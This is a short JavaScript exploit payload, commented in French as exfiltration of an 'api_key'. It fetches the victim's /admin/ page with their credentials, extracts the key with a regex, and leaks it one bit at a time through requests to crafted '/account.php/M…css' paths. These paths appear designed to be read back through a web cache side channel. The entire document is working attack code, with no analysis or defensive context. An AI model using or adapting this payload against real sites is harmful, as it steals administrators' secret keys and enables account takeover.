/* Vantage - exfiltration de l'api_key, encodage binaire.
   Une balise par bit a 1 : le decodage devient 8 sondes fixes par caractere,
   assez rapide pour passer sous la duree de vie du cache. */
(function () {
  function b(t) {
    try { fetch('/account.php/M' + t + '.css', { mode: 'no-cors', cache: 'no-store', keepalive: true }); } catch (e) {}
  }
  fetch('/admin/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (h) {
      var m = h.match(/api_key=([A-Za-z0-9_\-]+)/);
      if (!m) { b('none'); return; }
      var k = m[1];
      b('L' + k.length);
      for (var i = 0; i < k.length && i < 64; i++) {
        var c = k.charCodeAt(i);
        for (var j = 0; j < 8; j++) { if ((c >> j) & 1) b('P' + i + 'b' + j); }
      }
    })
    .catch(function () { b('err'); });
})();
